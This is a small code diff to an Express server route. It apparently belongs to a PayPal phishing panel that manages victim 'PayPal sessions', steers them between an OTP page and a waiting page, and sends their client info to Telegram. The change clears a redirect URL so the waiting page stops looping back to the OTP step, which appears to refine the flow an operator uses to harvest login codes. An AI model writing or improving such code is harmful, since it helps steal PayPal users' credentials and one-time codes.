@@ -603,6 +603,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(404).json({ error: "Session not found" });
       }
 
+      // Clear the redirect URL so the waiting page doesn't loop back to OTP
+      await storage.updatePaypalSession(sessionId, {
+        redirectUrl: null,
+      });
+
       const clientInfo = await getClientInfo(req);
 
       // Send notification to Telegram
